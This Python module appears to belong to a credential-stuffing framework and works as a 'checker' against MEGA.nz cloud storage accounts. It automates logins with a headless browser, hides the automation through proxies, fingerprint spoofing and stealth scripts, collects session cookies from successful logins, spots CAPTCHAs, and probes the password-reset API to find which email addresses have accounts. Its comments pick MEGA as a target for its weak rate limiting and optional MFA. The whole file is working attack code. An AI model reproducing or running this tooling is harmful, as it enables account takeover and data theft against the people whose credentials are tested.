"""
MEGA.nz Checker
Cloud storage service with high-value data
"""

from typing import Dict, Optional, Any
import asyncio
import aiohttp
from playwright.async_api import async_playwright, Browser, Page

from ..base import BaseChecker, CheckResult, CheckerResult
import logging

logger = logging.getLogger(__name__)


class MegaChecker(BaseChecker):
    """
    Checker for MEGA.nz cloud storage
    
    MEGA Characteristics:
    - Weak rate limiting
    - No mandatory MFA
    - High-value target (encrypted cloud storage)
    - Uses JavaScript-heavy login flow
    """
    
    LOGIN_URL = "https://mega.nz/login"
    API_URL = "https://g.api.mega.co.nz"
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("mega", config)
        self.browser: Optional[Browser] = None
    
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """
        Check MEGA credentials using browser automation
        
        Flow:
        1. Navigate to login page
        2. Fill in email and password
        3. Submit form
        4. Detect success/failure/CAPTCHA
        """
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            async with async_playwright() as p:
                # Launch browser with stealth
                browser_args = ['--disable-blink-features=AutomationControlled']
                
                if proxy:
                    proxy_config = {
                        'server': proxy.get_url()
                    }
                else:
                    proxy_config = None
                
                browser = await p.chromium.launch(
                    headless=True,
                    proxy=proxy_config,
                    args=browser_args
                )
                
                # Create context with fingerprint
                context_options = {}
                if fingerprint:
                    playwright_config = fingerprint.get_playwright_config(fingerprint)
                    context_options.update(playwright_config)
                
                context = await browser.new_context(**context_options)
                
                # Inject stealth scripts
                if fingerprint:
                    await context.add_init_script(
                        fingerprint.get_stealth_script(fingerprint)
                    )
                
                page = await context.new_page()
                
                # Navigate to login
                await page.goto(self.LOGIN_URL, wait_until='networkidle')
                
                # Fill in credentials
                await page.fill('input[name="email"]', email)
                await page.fill('input[name="password"]', password)
                
                # Submit
                await page.click('button[type="submit"]')
                
                # Wait for navigation or error
                try:
                    await page.wait_for_url('**/fm/**', timeout=10000)
                    
                    # Success - we're redirected to file manager
                    response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                    
                    # Extract session cookies
                    cookies = await context.cookies()
                    session_data = {
                        'cookies': cookies,
                        'url': page.url
                    }
                    
                    await browser.close()
                    
                    return CheckResult(
                        status=CheckerResult.SUCCESS,
                        email=email,
                        password=password,
                        service=self.service_name,
                        message="Login successful",
                        session_data=session_data,
                        response_time=response_time
                    )
                    
                except Exception:
                    # Login failed - check for error messages
                    response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                    
                    # Check for CAPTCHA
                    captcha_present = await page.query_selector('.g-recaptcha, [id*="captcha"]')
                    if captcha_present:
                        await browser.close()
                        return CheckResult(
                            status=CheckerResult.CAPTCHA,
                            email=email,
                            service=self.service_name,
                            message="CAPTCHA detected",
                            response_time=response_time
                        )
                    
                    # Check for error message
                    error_elem = await page.query_selector('.login-error, .error-msg')
                    error_msg = "Invalid credentials"
                    
                    if error_elem:
                        error_msg = await error_elem.inner_text()
                    
                    await browser.close()
                    
                    return CheckResult(
                        status=CheckerResult.FAILURE,
                        email=email,
                        service=self.service_name,
                        message=error_msg,
                        response_time=response_time
                    )
        
        except Exception as e:
            logger.error(f"MEGA checker error: {e}", exc_info=True)
            
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=str(e),
                response_time=(asyncio.get_event_loop().time() - start_time) * 1000
            )
    
    async def is_account_exists(
        self,
        email: str,
        proxy: Optional[Any] = None
    ) -> bool:
        """
        Check if an account exists by attempting password reset
        
        MEGA reveals account existence on the password reset page
        """
        
        try:
            proxy_url = proxy.get_url() if proxy else None
            
            async with aiohttp.ClientSession() as session:
                # Navigate to password reset
                async with session.get(
                    'https://mega.nz/recovery',
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    
                    if resp.status == 200:
                        # Submit email
                        async with session.post(
                            self.API_URL,
                            json={
                                'a': 'erm',  # Email reset method
                                'e': email
                            },
                            proxy=proxy_url
                        ) as reset_resp:
                            
                            data = await reset_resp.json()
                            
                            # MEGA returns different codes
                            # 0 = Success (account exists)
                            # -2 = Account not found
                            
                            return data.get('e') == 0 or 'success' in str(data)
            
            return False
            
        except Exception as e:
            logger.error(f"Error checking account existence: {e}")
            return False
